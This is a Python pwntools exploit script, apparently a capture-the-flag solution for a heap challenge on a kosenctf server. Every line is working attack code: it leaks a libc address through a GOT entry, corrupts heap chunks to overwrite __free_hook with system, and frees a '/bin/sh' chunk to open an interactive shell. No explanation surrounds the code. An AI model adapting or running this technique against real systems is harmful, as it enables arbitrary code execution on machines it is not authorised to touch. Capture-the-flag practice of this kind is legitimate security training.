#!/usr/bin/env python
from pwn import *

def malloc(name):
    s.sendlineafter('> ', '1')
    s.sendafter('Name: ', name)

def show(index):
    s.sendlineafter('> ', '2')
    s.sendlineafter('> ', str(index))
    return s.recvuntil(':')[:-1]

def free(index):
    s.sendlineafter('> ', '3')
    s.sendlineafter('> ', str(index))

if len(sys.argv) == 1:
    s = process('./chall')
else:
    s = remote('pwn.kosenctf.com', 9005)

elf = ELF('./chall')
libc = ELF('./libc-2.27.so')

malloc('A' * 0x10 + p64(elf.got['read']))
libc_base = u64(show((elf.symbols['name'] + 0x10 - elf.symbols['kittens']) // 8).ljust(8, '\0')) - libc.symbols['read']
log.info('libc base: %#x' % libc_base)

malloc('A' * 0x28)
malloc('A' * 0x28)
malloc('A' * 0x28)
malloc('A' * 0x28 + p64(0x61))
free(1)
malloc('A' * 0x28)
free(2)
free(3)
malloc('A' * 0x30 + p64(libc_base + libc.symbols['__free_hook']) + 'A' * 0x20)
malloc('A' * 0x28)
malloc(p64(libc_base + libc.symbols['system']) + 'A' * 0x20)
malloc('/bin/sh\0')
free(6)

s.interactive()
